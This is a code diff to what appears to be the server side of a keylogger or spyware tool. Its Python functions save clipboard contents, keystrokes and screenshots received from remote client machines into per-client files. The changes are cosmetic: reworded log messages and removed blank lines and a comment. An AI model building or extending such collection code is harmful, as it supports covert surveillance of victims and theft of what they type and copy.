@@ -10,7 +10,6 @@ def save_clipboard_data(client_dir, data):
         f"[{data['timestamp']}]\n"
         f"{data['content']}\n\n"
     )
-
     try:
         with open(file_path, "a", encoding="utf-8") as f:
             f.write(entry)
@@ -25,13 +24,12 @@ def save_keystroke_data(client_dir, data):
         f"[{data['timestamp']}]\n"
         f"{data['text']}\n\n"
     )
-
     try:
         with open(file_path, "a", encoding="utf-8") as f:
             f.write(entry)
-        log(f"Saved keystroke data to {file_path}", "SUCCESS", "filesystem")
+        log(f"Saved keystrokes data to {file_path}", "SUCCESS", "filesystem")
     except Exception as e:
-        log(f"Failed to save keystroke data: {e}", "ERROR", "filesystem")
+        log(f"Failed to save keystrokes data: {e}", "ERROR", "filesystem")
 
 
 def save_screenshot_data(client_dir, data):
@@ -61,7 +59,6 @@ def save_cached_data(client_dir, data):
     original_timestamp = data.get("original_timestamp", data["timestamp"])
 
     if data_type == "clipboard":
-        # Preserve original timestamp
         data["data"]["timestamp"] = original_timestamp
         save_clipboard_data(client_dir, data["data"])
     elif data_type == "keystroke":
@@ -86,6 +83,6 @@ def handle_data(client_ip, payload):
         elif data_type == "screenshot":
             save_screenshot_data(client_dir, payload)
         else:
-            log(f"Unknown data type: {data_type}", "WARNING", "filesystem")
+            log(f"Unknown data type '{data_type}' from {client_ip}", "WARNING", "filesystem")
     except Exception as e:
         log(f"Error handling data from {client_ip}: {e}", "ERROR", "filesystem")
